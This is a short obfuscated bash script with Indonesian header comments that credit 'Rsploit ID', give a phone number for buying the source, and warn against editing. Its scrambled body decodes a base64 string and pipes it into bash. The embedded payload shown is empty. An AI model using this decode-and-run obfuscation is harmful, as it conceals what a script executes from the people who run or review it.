# Obfuscated By Rsploit ID
# Mau Source Code ?
# Nih Wa Gua Inbox Kalo Mau Source Code : 082259177732
# Jangan Asal Recode Sc Orang
# Note : Jangan Di Edit Nanti Error Tod

 "${@,}" "${@//@zzuz9*O/Wz>:}"   \p${*,}r$'\u0069\u006et'f %s  "$(   ${*/H?C\"5AHe/*q>HviX}   ${*,,}  $'\u0070'${*,,}r\in$'\164'''$'\x66'  "" ${*/L3^6;wzZ/phSf\{G~}  |  ${!*} ${@//nco9%\{U} ${@//DjMI/=\[Az0Q}b''a$'s\145'$[  ((3#${@~~}11-3#10)+3#12) ]4   -d "${@##Z\(?d2\)}"    )" "${@/1mg<+\]}" |  ${*^^}   ${@,} \b$'\x61'"s"""h "${@,,}"  ${*}  
